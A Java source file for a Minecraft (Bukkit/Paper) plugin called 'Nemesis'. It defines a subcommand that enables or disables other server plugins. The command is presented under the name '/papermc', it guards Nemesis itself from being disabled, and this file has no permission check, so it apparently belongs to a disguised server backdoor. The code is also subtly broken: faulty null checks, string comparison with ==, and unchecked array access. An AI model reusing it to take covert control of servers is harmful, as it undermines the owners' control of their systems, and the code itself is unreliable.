package nemesis.commands.subcommands;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;

import nemesis.Nemesis;
import nemesis.Utils;
import nemesis.commands.SubCommand;

public class PluginManager implements SubCommand {

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (args.length > 1) {
            if (args[1] == null && args[1].isEmpty()) {
                sender.sendMessage(Utils.colorize("&cPlease specify a option!"));
                return;
            }

            if (args[2] == null && args[2].isEmpty()) {
                sender.sendMessage(Utils.colorize("&cPlease specify a plugin!"));
                return;
            }

            if (args[2] == Nemesis.getInstance().getName()) {
                sender.sendMessage(Utils.colorize("&cYou cannot do this to Nemesis!"));
                return;
            }

            if (args[1].equalsIgnoreCase("enable")) {
                Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(args[2]));
                sender.sendMessage(Utils.colorize("&aYou have successfully enabled the plugin " + args[2]));
            } else if (args[1].equalsIgnoreCase("disable")) {
                Bukkit.getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(args[2]));
                sender.sendMessage(Utils.colorize("&aYou have successfully disabled the plugin " + args[2]));
            } else {
                sender.sendMessage(Utils.colorize("&cUsage: /papermc pluginmanager <enable/disable> <plugin>"));
                return;
            }
        } else {
            sender.sendMessage(Utils.colorize("&cUsage: /papermc pluginmanager <enable/disable> <plugin>"));
        }
    }

    @Override
    public String getName() {
        return "pluginmanager";
    }
}